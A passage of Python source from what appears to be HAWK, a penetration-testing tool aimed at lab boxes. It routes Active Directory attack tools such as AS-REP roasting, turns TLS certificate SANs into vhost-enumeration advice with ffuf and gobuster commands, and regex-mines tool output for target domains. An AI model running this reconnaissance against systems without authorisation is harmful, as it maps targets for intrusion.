        # wordlist picker that's irrelevant for a single known target.
        if tool_id == "getnpusers":
            username = (pf.get("username") or pf.get("user") or "").strip()
            domain = (pf.get("domain") or "").strip()
            if not username:
                self.app.terminal.write(
                    "  [hawk] graph RUN IN asrep: no username in "
                    "prefill.", "error")
                return
            self._route_asrep_single_user(tool, username, domain)
            return

        # Fallback — most other AD tools go through _route_ad_template.
        try:
            self._route_ad_template(tool, prefill=pf)
        except Exception as e:
            self.app.terminal.write(
                f"  [hawk] graph RUN IN '{tool_id}' failed: {e}",
                "error")

    def _detect_cert_advisories(self, log: list) -> None:
        """Scan tool output for TLS cert advisories that the operator
        otherwise has to spot by hand:

        * **Wildcard SAN** — a SAN like ``DNS:*.kobold.htb`` is the
          single strongest signal of name-based virtual hosting on the
          target.  Emit a HIGH finding nudging the operator to do
          vhost enumeration NOW (it's the move that unlocks 95% of
          such boxes).

        * **Multiple non-wildcard SANs** — when the cert lists ≥ 2
          distinct hostnames (`kobold.htb, dev.kobold.htb`,
          `bin.kobold.htb`), surface them so the operator can map
          them to /etc/hosts and target each.

        Findings are emitted via ``target_intel.add_auto_finding`` —
        which dedupes on title — so re-running tools that re-emit the
        same SAN block won't spam the panel.  The hook is intentionally
        tolerant: any failure logs but does not raise.
        """
        import re
        if not log:
            return
        try:
            text = "\n".join(ln for _, ln in log)
        except Exception:
            text = "\n".join(str(x) for x in log)
        if "DNS:" not in text:
            return

        sans_raw = re.findall(r"DNS:\s*([\*\w.\-]+)", text)
        if not sans_raw:
            return
        # De-duplicate while preserving order.
        seen = set()
        sans = []
        for s in sans_raw:
            sl = s.strip().lower()
            if sl and sl not in seen:
                seen.add(sl)
                sans.append(sl)

        wildcards = [s for s in sans if s.startswith("*.")]
        non_wild  = [s for s in sans if not s.startswith("*.")]

        intel = getattr(self.app, "target_intel", None)
        if intel is None:
            return

        # Try to pin a base domain for the FUZZ VHOSTS button.
        base_domain = ""
        if wildcards:
            base_domain = wildcards[0][2:]
        elif non_wild:
            # Common suffix across non_wild entries.
            parts_list = [s.split(".") for s in non_wild]
            common = []
            for parts in zip(*[reversed(p) for p in parts_list]):
                if len(set(parts)) == 1:
                    common.insert(0, parts[0])
                else:
                    break
            base_domain = ".".join(common) if len(common) >= 2 else non_wild[0]

        # 1) Wildcard cert advisory ─────────────────────────────────────
        if wildcards:
            try:
                desc_lines = [
                    f"Cert SAN list:",
                ]
                for s in sans:
                    desc_lines.append(f"  • {s}")
                desc_lines.append("")
                desc_lines.append(
                    "A wildcard SAN means name-based virtual hosting "
                    "is in use behind this nginx / Apache / load "
                    "balancer.  Hitting the IP or the bare apex "
                    "domain often returns a placeholder — the real "
                    "app surface lives on subdomain vhosts the "
                    "operator hasn't discovered yet.")
                desc_lines.append("")
                desc_lines.append(
                    "Recommended next step: vhost enumeration.")
                desc_lines.append(
                    f"  ffuf -u https://{base_domain}/ "
                    f"-H 'Host: FUZZ.{base_domain}' "
                    f"-w /usr/share/seclists/Discovery/DNS/"
                    f"subdomains-top1million-5000.txt -ac -k")
                desc_lines.append(
                    f"  gobuster vhost -u https://{base_domain}/ "
                    f"-w /usr/share/seclists/Discovery/DNS/"
                    f"subdomains-top1million-5000.txt -k")
                intel.add_auto_finding(
                    title=f"Wildcard certificate detected ({base_domain})",
                    description="\n".join(desc_lines),
                    severity="high",
                    source="cert-advisory-wildcard")
            except Exception as e:
                import sys as _s
                print(f"[HAWK] cert advisory (wildcard) push failed: "
                      f"{e}", file=_s.stderr)

        # 2) Multi-host SAN advisory ────────────────────────────────────
        if len(non_wild) >= 2:
            try:
                desc_lines = [
                    f"Additional hostnames in cert SAN ({len(non_wild)} "
                    f"distinct):",
                ]
                for s in non_wild:
                    desc_lines.append(f"  • {s}")
                desc_lines.append("")
                desc_lines.append(
                    "Each of these hostnames is served by the same TLS "
                    "endpoint but may resolve to a different vhost.  "
                    "Map them locally and probe each before assuming "
                    "the apex domain is the real attack surface.")
                desc_lines.append("")
                desc_lines.append("Recommended next step:")
                desc_lines.append(
                    f"  echo '<TARGET_IP> {' '.join(non_wild)}' | "
                    f"sudo tee -a /etc/hosts")
                desc_lines.append(
                    "  Or use HAWK's DNS HELPER on the target bar — "
                    "the entries get HAWK-tagged and clean up "
                    "automatically on session delete.")
                intel.add_auto_finding(
                    title=(f"Multi-host certificate SAN "
                           f"({len(non_wild)} hosts)"),
                    description="\n".join(desc_lines),
                    severity="high",
                    source="cert-advisory-san")
            except Exception as e:
                import sys as _s
                print(f"[HAWK] cert advisory (multi-san) push failed: "
                      f"{e}", file=_s.stderr)

    def _detect_domain_candidates(self, log: list) -> list:
        """Scan any tool's output for plausible DNS / AD domain names.

        Returns a list of candidate dicts sorted by confidence (desc).
        Each candidate: {domain, source, confidence, evidence}.

        Sources and their confidence scores reflect how unambiguously
        each pattern identifies a real domain (vs. a random dotted string).
        """
        import re
        if not log:
            return []
        # Accept list-of-tuples [(level, line), ...] or flat list of strings.
        try:
            text = "\n".join(ln for _, ln in log)
        except Exception:
            text = "\n".join(str(x) for x in log)

        cand = []  # list of (domain, source, confidence, evidence)

        def _add(dom, src, conf, ev):
            dom = (dom or "").strip().rstrip(".").lower()
            if not dom or "." not in dom:
                return            # require proper FQDN
            # Reject IPs and obviously-bad values
            if re.match(r"^\d+\.\d+\.\d+\.\d+$", dom):
                return
            if dom in ("localhost.localdomain", "example.com",
                       "domain.com", "localhost"):
                return
            cand.append({"domain": dom, "source": src,
                         "confidence": conf, "evidence": ev})

        # 1.  LDAP namingContexts → DC=company,DC=local → "company.local"
        #     (confidence 95 — unambiguously the AD root).
        for m in re.finditer(
                r"namingContexts:\s*((?:DC=[^,\s]+,?\s*)+)", text, re.I):
            dcs = re.findall(r"DC=([^,\s]+)", m.group(1), re.I)
            if len(dcs) >= 2:
                _add(".".join(dcs), "ldapsearch (namingContexts)",
                     95, m.group(0))

        # 2.  NTLM challenge DnsDomainName / DnsTreeName — highest-
        #     quality leak from HTTP-NTLM, RDP, SMB (confidence 90).
        for m in re.finditer(
                r"(?:DnsDomainName|DnsTreeName|Dns_Domain_Name|DNS_DOMAIN_NAME)[:\s]+"
                r"([\w.-]+\.[\w.-]+)", text, re.I):
            _add(m.group(1), "NTLM challenge (SMB/RDP/HTTP)", 90, m.group(0))

        # 3.  enum4linux / nxc / rpcclient style "Domain Name" with FQDN
        #     — only matches when there's a dot (skips plain NetBIOS).
        for m in re.finditer(
                r"Domain [Nn]ame\s*[:=]\s*([\w-]+\.[\w.-]+)", text):
            _add(m.group(1), "enum4linux / nxc (Domain Name)",
                 88, m.group(0))

        # 4.  nmap smb-os-discovery  "Forest:" / "Primary Domain:" /
        #     "NetBIOS domain name:" — these are the AD DOMAIN.
        #
        #     FQDN was REMOVED from this regex.  In nmap output FQDN
        #     is the *HOST'S* fully-qualified DNS name (e.g.
        #     "DC01.metasploitable.lab"), NOT the domain itself.
        #     Capturing it as a domain candidate caused the bug
        #     that overwrote a pinned `metasploitable.lab` with the
        #     box's own FQDN like "vagrant-2008r2.prova.prova.com"
        #     when the host's local DNS suffix differed from the
        #     AD domain.  If we EVER want to recover the domain
        #     from FQDN, we'd have to strip the first label — but
        #     that's already what the AD-specific fields above do
        #     correctly, so dropping FQDN entirely is the safer fix.
        for m in re.finditer(
                r"(?:Forest|Primary Domain|NetBIOS domain name)\s*[:=]\s*"
                r"([\w-]+\.[\w.-]+)", text, re.I):
            _add(m.group(1), "nmap smb-os-discovery", 85, m.group(0))

        # 5.  SSL/TLS cert Subject CN (nmap --script ssl-cert, openssl
        #     s_client, curl -v).  Strip wildcards.
        for m in re.finditer(
                r"(?:Subject:[^\n]*?|commonName\s*=\s*)CN\s*=\s*"
                r"([\*\w.-]+\.[\w.-]+)", text, re.I):
            cn = m.group(1).lstrip("*.").strip()
            # Skip self-signed placeholders and numeric CNs
            if cn and not re.match(r"^\d+\.\d+\.\d+\.\d+$", cn):
                _add(cn, "SSL/TLS certificate (CN)", 85, m.group(0))

        # 6.  SSL SAN entries (Subject Alternative Name: DNS:foo.bar)
        for m in re.finditer(r"DNS:\s*([\*\w.-]+\.[\w.-]+)", text):
            dns = m.group(1).lstrip("*.").strip()
            _add(dns, "SSL/TLS certificate (SAN)", 80, m.group(0))

        # 7.  Kerberos realm echo — kerbrute, GetNPUsers, AS-REQ traces
        for m in re.finditer(
                r"(?:Realm|realm|@)\s*[:=]?\s*([A-Z][A-Z0-9.-]+\.[A-Z]{2,})",
                text):
            _add(m.group(1), "Kerberos realm", 80, m.group(0))

        # 8.  Reverse DNS (dig -x, host, nslookup)  — PTR record
        for m in re.finditer(
                r"(?:PTR\s+|name\s*=\s*|pointer\s*=\s*)"
                r"([\w-]+\.[\w.-]+)\.?\b", text):
            _add(m.group(1), "reverse DNS (PTR)", 65, m.group(0))

        # 9.  HTTP Location / redirect headers with hostname.
        for m in re.finditer(
                r"Location:\s*https?://([\w-]+\.[\w.-]+)",
                text, re.I):
            _add(m.group(1), "HTTP redirect (Location)", 55, m.group(0))

        # 10. WhatWeb / nikto-style "Host:" grabs
        for m in re.finditer(r"Target Hostname:\s*([\w-]+\.[\w.-]+)", text):
            _add(m.group(1), "nikto / whatweb", 60, m.group(0))

        # De-duplicate by domain, keep highest confidence per domain.
        best = {}
        for c in cand:
            d = c["domain"]
            if d not in best or c["confidence"] > best[d]["confidence"]:
                best[d] = c
        return sorted(best.values(),
                      key=lambda x: -x["confidence"])

